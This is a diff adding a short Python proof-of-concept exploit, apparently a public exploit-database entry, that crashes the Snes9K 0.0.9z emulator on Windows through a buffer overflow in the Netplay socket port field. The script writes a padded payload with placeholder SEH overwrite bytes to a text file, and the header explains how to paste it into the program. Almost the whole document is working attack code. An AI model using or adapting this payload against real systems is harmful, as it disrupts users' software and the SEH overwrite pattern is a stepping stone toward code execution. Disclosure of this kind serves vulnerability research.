@@ -1,0 +1,20 @@
+# Exploit Title: Snes9K 0.0.9z - Denial of Service (PoC)
+# Date: 2018-09-28
+# Exploit Author: crash_manucoot
+# Vendor Homepage: https://sourceforge.net/projects/snes9k/
+# Software Link: https://sourceforge.net/projects/snes9k/files/latest/download
+# Version: 0.0.9z
+# Tested on: Windows 7 Home Premium x86 SPANISH
+# Category: Windows Local Exploit
+# How to use: open the program go to Netplay-Options-paste the contents of open.txt 
+# in the Socket Port Number and Boom 
+
+buffer = "A" * 260
+nseh = "B" * 4 
+seh = "C" * 4 
+junk = "D" * 300
+
+evil = buffer + nseh + seh + junk
+
+file = open('open.txt','w+')
+file.write(evil)
